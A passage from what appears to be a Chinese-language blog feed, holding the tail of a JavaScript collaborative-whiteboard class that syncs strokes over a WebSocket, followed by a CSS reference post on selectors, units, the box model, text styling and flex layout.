class="line">    this.socket.send(JSON.stringify(&#123; kind: 1, points: this.strokes &#125;));</span><br><span class="line">  &#125;</span><br><span class="line">  addPoint = (x, y, newStroke, str) =&gt; &#123;</span><br><span class="line">    const p = &#123; x, y &#125;;</span><br><span class="line">    const &#123; graphType &#125; = this;</span><br><span class="line">    if (graphType === &apos;text&apos;) &#123;</span><br><span class="line">      const d = &#123; data: [p], text: str, strokeColor: this.strokeColor, graphType: this.graphType &#125;;</span><br><span class="line">      this.strokes.push(d);</span><br><span class="line">    &#125; else if (newStroke) &#123;</span><br><span class="line">      const d = &#123; data: [p], strokeColor: this.strokeColor, width: this.lineWidth, graphType: this.graphType &#125;;</span><br><span class="line">      this.strokes.push(d);</span><br><span class="line">    &#125; else if (graphType === &apos;pencil&apos; || graphType === &apos;rubber&apos;) &#123;</span><br><span class="line">      this.strokes[this.strokes.length - 1].data.push(p);</span><br><span class="line">    &#125; else if (graphType === &apos;line&apos; || graphType === &apos;circle&apos; || graphType === &apos;square&apos;) &#123;</span><br><span class="line">      this.strokes[this.strokes.length - 1].data[1] = p;</span><br><span class="line">    &#125;</span><br><span class="line">    this.repaint();</span><br><span class="line">  &#125;</span><br><span class="line">  repaint = () =&gt; &#123;</span><br><span class="line">    // 清空再重绘</span><br><span class="line">    repaint(this.ctx, this.strokes);</span><br><span class="line">  &#125;</span><br><span class="line">  // 设置画笔粗细</span><br><span class="line">  setLineWidth = (width) =&gt; &#123;</span><br><span class="line">    this.lineWidth = width;</span><br><span class="line">  &#125;</span><br><span class="line">  // 设置类型 &#123;pencil, line, circle, square, rubber, text&#125;</span><br><span class="line">  setGraphType = (graphType) =&gt; &#123;</span><br><span class="line">    this.graphType = graphType;</span><br><span class="line">  &#125;</span><br><span class="line">  // 设置画笔颜色</span><br><span class="line">  setGraphColor = (color) =&gt; &#123;</span><br><span class="line">    this.strokeColor = color;</span><br><span class="line">  &#125;</span><br><span class="line">  // 清空</span><br><span class="line">  clear = () =&gt; &#123;</span><br><span class="line">    this.strokes = [];</span><br><span class="line">    this.ctx.clearRect(0, 0, canvas.width, canvas.height);</span><br><span class="line">    this.sendStrokes();</span><br><span class="line">  &#125;</span><br><span class="line">  // 撤销</span><br><span class="line">  cancelOneStep = () =&gt; &#123;</span><br><span class="line">    if (this.strokes.length &gt; 0) &#123;</span><br><span class="line">      this.redo.push(this.strokes[this.strokes.length - 1]);</span><br><span class="line">      this.strokes.pop();</span><br><span class="line">      this.repaint();</span><br><span class="line">      this.sendStrokes();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  // 恢复：再执行最近依次操作</span><br><span class="line">  redoStep = () =&gt; &#123;</span><br><span class="line">    if (this.redo.length &gt; 0) &#123;</span><br><span class="line">      this.strokes.push(this.redo[this.redo.length - 1]);</span><br><span class="line">      this.redo.pop();</span><br><span class="line">      this.repaint();</span><br><span class="line">      this.sendStrokes();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export class ClientBoard &#123;</span><br><span class="line">  constructor(options) &#123;</span><br><span class="line">    this.canvas = document.getElementById(&apos;canvas&apos;);</span><br><span class="line">    this.ctx = this.canvas.getContext(&apos;2d&apos;);</span><br><span class="line">    const &#123; wid, token &#125; = options;</span><br><span class="line">    const ws = `ws://live.ngrok.elitemc.cn:8000/ws/whiteboard-$&#123;wid&#125;?token=$&#123;token&#125;`;</span><br><span class="line">    this.socket = new WebSocket(ws);</span><br><span class="line">    this.socket.onmessage = (event) =&gt; &#123;</span><br><span class="line">      const messages = event.data.split(&apos;\n&apos;);</span><br><span class="line">      messages.map((data) =&gt; &#123;</span><br><span class="line">        this.onMessage(JSON.parse(data));</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    this.socket.onopen = (event) =&gt; &#123;</span><br><span class="line">      // console.log(event);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  onMessage = (message) =&gt; &#123;</span><br><span class="line">    repaint(this.ctx, message.points);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS文档</title>
      <link href="/2018/10/06/CSS%E6%96%87%E6%A1%A3/"/>
      <url>/2018/10/06/CSS%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-基础"><a href="#1-基础" class="headerlink" title="1. 基础"></a>1. 基础</h3><p><img src="/2018/10/06/CSS文档/1.svg" style="padding-top:20px; max-width:500px"></p><h4 id="1-1-浏览器样式前缀"><a href="#1-1-浏览器样式前缀" class="headerlink" title="1.1 浏览器样式前缀"></a>1.1 浏览器样式前缀</h4><table><thead><tr><th>浏览器分类</th><th style="text-align:center">浏览器</th><th style="text-align:right">私有属性的前缀</th></tr></thead><tbody><tr><td>Gecko引擎内核的浏览器</td><td style="text-align:center">Mozilla(Firefox)</td><td style="text-align:right">-moz-</td></tr><tr><td>Presto引擎内核的浏览器</td><td style="text-align:center">Opera</td><td style="text-align:right">-o-</td></tr><tr><td>KHTML引擎内核的浏览器</td><td style="text-align:center">Konqueror</td><td style="text-align:right">-khtml-</td></tr><tr><td>Trident引擎内核的浏览器</td><td style="text-align:center">Internet Explorer</td><td style="text-align:right">-ms- </td></tr><tr><td>Webkit</td><td style="text-align:center">Chrome, Safari</td><td style="text-align:right">-webkit-</td></tr></tbody></table><h4 id="1-2-选择器"><a href="#1-2-选择器" class="headerlink" title="1.2 选择器"></a>1.2 选择器</h4><ul><li><p>属性选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-quantity=&quot;1kg&quot; data-vegetable=&quot;not spicy like chili&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">[attr]       具有attr属性的元素</span><br><span class="line">[attr=val]   attr属性值为val的元素</span><br><span class="line">[attr~=]     attr属性值包含val的元素</span><br><span class="line"></span><br><span class="line">[attr|=val]  attr属性值是 val 或值以 val- 开头的元素</span><br><span class="line">[attr^=val]  attr属性值以 val 开头的元素</span><br><span class="line">[attr$=val]  attr属性值以 val 结尾的元素</span><br><span class="line">[attr*=val]  attr属性值包含 val 的元素</span><br></pre></td></tr></table></figure></li><li><p>伪类选择器<br>一个CSS伪类 是一个以冒号(:)作为前缀，被添加到一个选择器末尾的关键字。当你希望样式在特定状态下才呈现特定样式，你可以在该元素选择器后加上对应的伪类。</p></li></ul><table><thead><tr><th>伪类选择器</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>:active</td><td style="text-align:center">被激活的元素，通常匹配tab交互。这个样式可能会被其它伪类覆盖。<br>链接伪类css顺序<code>:link - :visited - :hover - :active</code></td></tr><tr><td>:visited</td><td style="text-align:center">被访问过的链接</td></tr><tr><td>:hover</td><td style="text-align:center">光标悬停</td></tr><tr><td>:focus</td><td style="text-align:center">获得焦点的元素。用户点击、触摸元素，或通过键盘tab键选择它时会触发。</td></tr><tr><td>:link</td><td style="text-align:center"><code>a:link</code>选中元素当中的链接</td></tr><tr><td>:checked</td><td style="text-align:center">处于选中状态的radio, checkbox, 或select中的option元素</td></tr><tr><td>:disabled</td><td style="text-align:center">任何被禁用的元素</td></tr><tr><td>:enabled</td><td style="text-align:center">任何启用的元素</td></tr><tr><td>:invalid</td><td style="text-align:center"><code>&lt;input&gt;</code>或其它<code>&lt;form&gt;元素</code>内容未通过验证 <code>&lt;input type=&quot;email&quot; /&gt;</code></td></tr><tr><td>:valid</td><td style="text-align:center"><code>&lt;input&gt;</code>或其它<code>&lt;form&gt;元素</code>内容通过验证 </td></tr><tr><td>:in-range</td><td style="text-align:center"><code>&lt;input&gt;</code>当前值处于min和max范围内</td></tr><tr><td>:out-of-range</td><td style="text-align:center"><code>&lt;input&gt;</code>当前值处于min和max范围外</td></tr><tr><td>:read-only</td><td style="text-align:center">元素不可被用户编辑的状态</td></tr><tr><td>:read-wirte</td><td style="text-align:center">可被用户编辑</td></tr><tr><td>:required</td><td style="text-align:center">拥有required属性的<code>&lt;input&gt;&lt;select&gt;&lt;textarea&gt;</code>元素</td></tr><tr><td>:optional</td><td style="text-align:center">没有required属性的<code>&lt;input&gt;&lt;select&gt;&lt;textarea&gt;</code>元素</td></tr><tr><td>:empty</td><td style="text-align:center">没有子元素的元素(子元素可以是元素节点、文本、空格)</td></tr><tr><td>:first-child</td><td style="text-align:center">一组兄弟元素中的第一个元素 (:first-of-type)</td></tr><tr><td>:last-child</td><td style="text-align:center">一组兄弟元素中的最后一个元素</td></tr><tr><td>:not(selector)</td><td style="text-align:center"><code>p :not(div) :not(.fancy)</code> 非<code>&lt;div&gt;</code>或类名不是<code>.fancy</code>的<code>&lt;p&gt;</code></td></tr><tr><td>:nth-child(an+b)</td><td style="text-align:center">选择结果为第(an+b)个元素的集合(n=0,1,2…)<br> <code>tr:nth-child(2n+1/2n) 奇数/偶数行；span:nth-child(-n+3) 前三个元素</code></td></tr><tr><td>:root</td><td style="text-align:center">匹配文档树的根元素，表示<code>&lt;html&gt;</code>元素</td></tr><tr><td>:target</td><td style="text-align:center">ID与当前URL片段匹配，如 <code>http://www.example.com#section2</code>; <br><code>&lt;section id=&quot;section2&quot;&gt;&lt;/section&gt;; :target{color:red}</code></td></tr><tr><td>:lang()</td><td style="text-align:center">基于元素语言来匹配页面元素</td></tr><tr><td>@page:first</td><td style="text-align:center">打印文档时，第一页的样式 <code>@page:first{ margin-left: 50% }</code></td></tr></tbody></table><p><strong> :first-child不生效：使用:first-child伪类时一定要保证前面没有兄弟节点。</strong></p><ul><li>伪元素 </li></ul><table><thead><tr><th>伪元素</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>::after</td><td style="text-align:center">创建一个伪元素，其将成为元素的最后一个子元素，通常会配合content属性来为该元素添加装饰内容。</td></tr><tr><td>::before</td><td style="text-align:center">创建一个伪元素，其将成为元素的第一个子元素，通常会配合content属性来为该元素添加装饰内容。</td></tr><tr><td>::first-letter</td><td style="text-align:center">选中该块级元素第一行的第一个字母，并且文字所处的行之前没有其他内容(如图片或表格)</td></tr><tr><td>::first-line</td><td style="text-align:center">选中该块级元素的第一行应用样式</td></tr><tr><td>::selection</td><td style="text-align:center">应用于文档中被用户高亮的部分（使用鼠标或其他设备选中的部分）</td></tr></tbody></table><ul><li>组合器</li></ul><table><thead><tr><th>组合器</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>A,B</td><td style="text-align:center">匹配满足A或B的任意元素</td></tr><tr><td>A B</td><td style="text-align:center">匹配B元素，B是A的后代节点</td></tr><tr><td>A &gt; B</td><td style="text-align:center">匹配B元素，B是A的直接子节点</td></tr><tr><td>A + B</td><td style="text-align:center">匹配B元素，AB有相同的父节点，并且B紧跟在A的后面</td></tr><tr><td>A ~ B</td><td style="text-align:center">匹配B元素，AB有相同的父节点，B在A之后，但不一定紧挨着A</td></tr></tbody></table><p><br></p><h4 id="1-3-值和单位"><a href="#1-3-值和单位" class="headerlink" title="1.3 值和单位"></a>1.3 值和单位</h4><table><thead><tr><th>单位</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>px</td><td style="text-align:center">绝对单位</td></tr><tr><td>em</td><td style="text-align:center">1em与当前元素的字体大小相同。em单位会继承父元素的字体大小<strong>(最常用的相对单位)</strong></td></tr><tr><td>rem</td><td style="text-align:center">与em相似，但它总是等于默认基础字体大小的尺寸，继承将不起作用</td></tr><tr><td>vw,vh</td><td style="text-align:center">视口宽度的1/100和视口高度的1/100(不被广泛支持)</td></tr><tr><td>ex,ch</td><td style="text-align:center">小写x的高度和数字0的宽度(不被广泛支持)</td></tr></tbody></table><p><em>无单位的值</em>: 0, line-height: 1.8, 动画的数值, 百分比, 颜色</p><p><br></p><h4 id="1-4-层叠和继承"><a href="#1-4-层叠和继承" class="headerlink" title="1.4 层叠和继承"></a>1.4 层叠和继承</h4><ul><li>!important &gt; 行内样式-1000 &gt; id选择器-100 &gt; 类选择器/属性选择器/伪类-10 &gt; 元素选择器/伪元素-1</li><li>后面的规则 &gt; 前面的规则</li><li>继承: inherit - 与父元素一样; initial - 与浏览器默认样式一样; unset - 重置为自然值; </li></ul><p><br></p><h4 id="1-5-盒模型"><a href="#1-5-盒模型" class="headerlink" title="1.5 盒模型"></a>1.5 盒模型</h4><p>每个元素被表示为一个矩形的方框，框的内容、内边距、边界、外边距一层层构建起来。浏览器渲染网页布局时，会算出每个框每一层要用什么样式，以及框放在哪里。<br>盒子属性: width, height, padding, margin, border, min-width, max-width, min-height, max-height</p><p><em><code>box-sizing</code></em></p><ul><li><p>content-box<br>W3C标准盒模型: element width = border + padding + content width<br><img src="/2018/10/06/CSS文档/1.png"></p></li><li><p>border-box<br>IE盒模型: element width = content width(内容宽度包含了content width，border, padding, 建议使用)<br><img src="/2018/10/06/CSS文档/2.png"></p></li></ul><p><em><code>overflow</code></em><br>当你设置了一个框的大小，允许的大小可能不适合放置内容，这种情况下内容会从盒子溢流。使用overflow，或overflow-x,overflow-y来控制这种情况。<br>auto: &nbsp;&nbsp;&nbsp; 溢流的内容被隐藏，出现滚动条来查看<br>hidden: 溢流的内容被隐藏<br>visible: 溢流的内容被显示在盒子的外边（这是默认行为）<br>scroll: 不管内容有没有溢出容器，都会显示滚动条<br>no-display: 内容溢出容器时，不显示元素，相当于添加了display:none<br>no-content: 内容溢出容器时，不显示内容，相当于添加了visibility:hidden</p><p><em><code>display</code></em><br>block:  内容独占一行，可以设置宽高<br>inline: 与周围的行内元素出现在同一行，设置宽高无效，设置padding,margin,border会更新周围文字的位置<br>inline-block: 不会独占一行，能设置宽高</p><p><br></p><h3 id="2-文字"><a href="#2-文字" class="headerlink" title="2. 文字"></a>2. 文字</h3><p><em><code>文字</code></em><br>color, font-family, font-size, line-height, letter-spacing(字母间距), word-spacing(单词间距)<br>font-style  : normal, italic斜体, oblique<br>font-weight : normal, bold, lighter, bolder<br>text-transform : none, uppercase, lowercase, capitalize, full-width<br>text-decoration: none, underline, overline, line-through<br>text-shadow: 4px 4px 5px red (水平偏移, 垂直偏移, 模糊半径, 颜色，逗号分隔多个阴影值可用于同一文本)<br>text-align: left, right, center, justify(使文本展开)<br>@font-face: 使用字体文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">  font-family: &apos;ciclefina&apos;;</span><br><span class="line">  src: url(&apos;fonts/cicle_fina-webfont.eot&apos;);</span><br><span class="line">  src: url(&apos;fonts/cicle_fina-webfont.eot?#iefix&apos;) format(&apos;embedded-opentype&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.woff2&apos;) format(&apos;woff2&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.woff&apos;) format(&apos;woff&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.ttf&apos;) format(&apos;truetype&apos;),</span><br><span class="line">         url(&apos;fonts/cicle_fina-webfont.svg#ciclefina&apos;) format(&apos;svg&apos;);</span><br><span class="line">  font-weight: normal;</span><br><span class="line">  font-style: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em><code>文本布局</code></em><br>text-indent<br><strong>text-overflow</strong>: 溢出内容显示符号。clip 被剪切 / ellipsis 省略号<br><strong>white-space</strong>: 处理元素中的空白。 normal 连续的空白符会被合并,必要时会换行 / pre / nowrap / pre-wrap 连续的空白符会被保留，必要时会换行 / pre-line<br><strong>word-break</strong>: 指定单词内断行。normal 默认的断行规则，中文到边界上的汉字换行， / break-all 可在任意字符间断行 / keep-all<br><strong>word-wrap</strong>: 当一个不能被分开的字符串太长而不能填充其包裹盒时，为防止溢出，是否这样的单词中断换行。 normal 单词结束处换行 / break-word 强制切割换行<br><strong>text-align-last</strong>: 最后一行文本的对齐规则。 auto / start / end / left / right / center / justify</p><p><em><code>列表 - ul</code></em><br><strong>list-style-type</strong> : 列表符号的类型。disc 实心原点 / circle 空心原点 / square 实心方块 / decimal 数字1,2 / decimal-leading-zero 数字01,02 / lower-roman  i, ii / upper-roman I, II / lower-greek α, β, γ / lower-alpha a,b,c / upper-alpha A,B,C<br><strong>list-stype-position</strong> : 列表符号在盒内还是盒外。inside / outside<br><strong>list-style-image</strong>: url(‘1.png’)</p><p><br></p><h3 id="3-区块"><a href="#3-区块" class="headerlink" title="3. 区块"></a>3. 区块</h3><p><em><code>背景</code></em><br>默认情况下，背景会延伸到边框所在的区域下层。<br>background-color<br><strong>background-image</strong>: url(‘1.png’) / 渐变 linear-gradient(渐变的方向, 开始的颜色, 结尾的颜色) to bottom, to right, to bottom right<br><strong>background-repeat</strong>: 指定背景图像如何重复。 no-repeat / repeat-x / repeat-y / repeat<br><strong>background-position</strong>: 指定图像(x,y)坐标. 200px 25px / 10% 20% / 使用关键字 [left,center,right], [top,center,bottom]<br><strong>background-attachment</strong>: 设置元素背景图片是否固定或者随着页面的其余部分滚动，一般运用在html或body上 scroll / fixed<br><strong>background-size</strong>: 调整背景图像大小。auto 图片原始宽高 / <code>&lt;length&gt;&lt;percentage&gt;</code> 具体宽高 / cover 完全覆盖背景区，图像比例不变，图片部分看不见 / contain 单边覆盖背景区，图像比例不变，背景区部分空白</p><p><em><code>边框</code></em><br>border, border-width, border-color, border-radius, border-image<br>border-style: none/ hidden / solid / dashed / dotted / double / groove / ridge / inset / outset / inherit</p><p><em><code>表格</code></em><br>table-layout: fixed, 创建可预测的表布局，在标题设置width设置列的宽度<br>border-collapse: collapse, 使表元素边框合并</p><p><em><code>高级区块效果</code></em><br>box-shadow: 5px 5px 5px rgba(0,0,0,.7) 水平偏移量,垂直偏移量,模糊半径,颜色<br>box-shadow: inset 5px 5px 5px rgba(0,0,0,.7) <strong>inset</strong> 定义内部阴影<br>background-blend-mode: 将单个元素的多重背景图片和背景颜色设置混合在一起<br>mix-blend-mode: 将一个元素与它覆盖的那些元素各自设置的背景和内容混合在一起。normal | multiply | screen | overlay | darken | lighten | color-dodge | color-burn | hard-light | soft-light | difference | exclusion | hue | saturation | color | luminosity</p><p><br></p><h3 id="4-排版"><a href="#4-排版" class="headerlink" title="4. 排版"></a>4. 排版</h3><p>正常布局流: position:static，是指在不对页面进行任何布局控制时，浏览器默认的HTML布局方式。<br><br></p><h4 id="4-1-浮动"><a href="#4-1-浮动" class="headerlink" title="4.1 浮动"></a>4.1 浮动</h4><p>float:left/right/none/inherit。浮动元素会脱离正常的文档布局流，并吸附到其父容器的左边(float:left)。在正常布局中位于该浮动元素之下的内容，此时会围绕着浮动元素，填满其右侧的空间。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 首字母下沉</span><br><span class="line">p::first-letter&#123;</span><br><span class="line">  font-size: 3rem;</span><br><span class="line">  float: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>清除浮动</em>: 所有在浮动下面的自身不浮动的内容都将围绕浮动元素进行包装。如果没有处理这些元素，就会变得很糟糕。<code>{ clear: both }</code>当把这个应用到一个元素时，意味着“此处停止浮动”。<br><br></p><h4 id="4-2-定位"><a href="#4-2-定位" class="headerlink" title="4.2 定位"></a>4.2 定位</h4><p>绝对定位(Static positioning)：元素在文档布局流的默认位置<br>相对定位(Relative positioning): 在正常文档流中的位置进行相对移动<br>绝对定位(Absolute positioning): 将元素完全从页面的正常布局流中移出。元素相对最近被定位的祖先元素固定。<br>固定定位(Fixed positioning): 将元素完全从页面的正常布局流中移出。将一个元素相对浏览器视口固定。<br><br></p><h4 id="4-3-flex布局"><a href="#4-3-flex布局" class="headerlink" title="4.3 flex布局"></a>4.3 flex布局</h4><p>支持浏览器 Chrome 21+, Opera 12.1+, Firefox 22+, Safari 6.1+, IE 10+。</p><p>采用flex布局的元素，称为flex容器。它的所有子元素自动成为容器成员，子元素的float, clear和vertical-align属性将失效。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  display: inline-flex;   // 行内元素也可以使用flex</span><br><span class="line">  display: -webkit-flex;  // 兼容Safari</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>容器存在两根轴：水平的主轴(main axis)和垂直的交叉轴(cross axis)。主轴的开始位置叫<code>main start</code>， 结束位置叫<code>main end</code>， 交叉轴开始位置叫<code>cross start</code>， 结束位置叫<code>cross end</code>。<br><img src="/2018/10/06/CSS文档/4.png" style="max-width:500px"></p><p><br></p><h5 id="4-3-1-容器的属性"><a href="#4-3-1-容器的属性" class="headerlink" title="4.3.1 容器的属性"></a>4.3.1 容器的属性</h5><ul><li>flex-direction: 决定主轴的方向<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  flex-direction: row | row-reverse | column | column-reverse </span><br><span class="line">&#125;</span><br><span class="line">// row(默认值)     主轴为水平方向，起点在左端</span><br><span class="line">// row-reverse    主轴为水平方向，起点在右端</span><br><span class="line">// column         主轴为垂直方向，起点在上方</span><br><span class="line">// column-reverse 主轴为垂直防线，起点在下方</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/5.png" style="max-width:500px"></p><p><br></p><ul><li>flex-wrap: 如果一条轴线排不下，如何换行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  flex-wrap: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br><span class="line">// nowrap       不换行</span><br><span class="line">// wrap         换行，第一行在上方</span><br><span class="line">// wrap-reverse 换行，第一行在下方</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/6.png" style="max-width:500px"><br><img src="/2018/10/06/CSS文档/7.png" style="max-width:500px"><br><img src="/2018/10/06/CSS文档/8.jpg" style="max-width:500px"><br><br></p><ul><li><p>flex-flow: 是flex-direction属性和flex-wrap属性的简写模式，默认值为row nowrap。</p></li><li><p>justify-content: 项目在主轴上的对齐方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  justify-content: flex-start | flex-end | center | space-between | space-around;</span><br><span class="line">&#125;</span><br><span class="line">// flex-start(默认值)  左对齐</span><br><span class="line">// flex-end           右对齐</span><br><span class="line">// center             居中</span><br><span class="line">// space-between      两端对齐，项目之间的间隔都相等</span><br><span class="line">// space-around       每个项目两侧都相等</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/9.png" style="max-width:500px"></p><p><br></p><ul><li>align-items: 项目在交叉轴上如何对齐<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  align-items: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br><span class="line">// flex-start     交叉轴的起点对齐</span><br><span class="line">// flex-end       交叉轴的终点对齐</span><br><span class="line">// center         交叉轴的中点对齐</span><br><span class="line">// baseline       项目第一行文字的基线对齐</span><br><span class="line">// stretch(默认值) 如果项目未设置高度或为auto，将占满整个容器的高度</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/10.png" style="max-width:500px"></p><ul><li>align-content: 定义了多根轴线的对齐方式。</li></ul><p><br></p><h5 id="4-3-2-项目的属性"><a href="#4-3-2-项目的属性" class="headerlink" title="4.3.2 项目的属性"></a>4.3.2 项目的属性</h5><ul><li>order: 定义项目的排列顺序。数值越小，排列越靠前，默认为0.<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">  order: &lt;integer&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/11.png" style="max-width:500px"><br><br></p><ul><li>flex-grow: 定义项目的放大比例，默认为0。如果项目的<code>flex-grow</code>属性都为1，则它们将等分剩余空间。如果一个项目的<code>flex-grow</code>属性为2，其余为1，则前者占据的剩余空间将比其他项多一倍。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">  flex-grow: &lt;number&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/10/06/CSS文档/12.png" style="max-width:500px"></p><ul><li>flex-shrink: 定义了项目的缩小比例，默认为1。如果空间不足，项目将缩小。如果项目的<code>flex-shrink</code>属性都为1，当空间不足时，都将等比例缩小。如果一个项目的<code>flex-shrink</code>属性为0，其他项目为都为1，空间不足时，前者不缩小。<br><img src="/2018/10/06/CSS文档/13.jpg" style="padding-top:20px;max-width:500px"><br><br></li><li><p>flex-basis: 定义了在分配多余空间之前，项目占据的主轴空间。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。</p></li><li><p>flex: 是<code>flex-grow, flex-shrink 和 flex-basis</code>的简写，默认值为<code>0 1 auto</code>。 </p></li><li><p>align-self: 允许单个项目有与其他项目不一样的对齐方式，可覆盖<code>align-items</code>属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">  align-self: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-4-flex布局实例"><a href="#4-4-flex布局实例" class="headerlink" title="4.4 flex布局实例"></a>4.4 flex布局实例</h4><ul><li>网格布局，平均分布<style>.box{  width:100%;  height:50px;  display:flex;  margin-top:10px;  background:#f6f6f6;}.item{  background:#fff;  margin:10px;  flex:1;}</style><div class="box">  <div class="item"></div>  <div class="item"></div>  <div class="item"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.item&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>百分比布局<style>.box{  width:100%;  height:50px;  display:flex;  margin-top:10px;  background:#f6f6f6;  text-align:center;}.item1{  background:#fff;  margin:10px;  flex:0 0 25%;}.item2{  background:#fff;  margin:10px;  flex:1;}</style><div class="box">  <div class="item1">1/4</div>  <div class="item2">auto</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  display:flex;</span><br><span class="line">&#125;</span><br><span class="line">.item1&#123;</span><br><span class="line">  flex:0 0 25%;</span><br><span class="line">&#125;</span><br><span class="line">.item2&#123;</span><br><span class="line">  flex:1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>圣杯布局： 页面从上到下，分成header, body, footer。其body从左到右又分为导航，主栏，副栏。<br>固定的底栏：页面内容太少，无法占满一屏的高度，底栏就会抬高到页面的中间，这时可以采用该布局。<style>.box1{  display: flex;  display: -ms-flexbox;  min-height: 200px;  flex-direction: column;  -ms-flex-direction: column;  margin-top: 10px;  background:#f6f6f6;  text-align: center;  padding:10px;}.box1 div{  background: #fff;}.box1 .box1-container{  background: #f6f6f6;}.box1 .box1-header{  flex:0 0 20px;  -ms-flex: 0 0 20px;}.box1 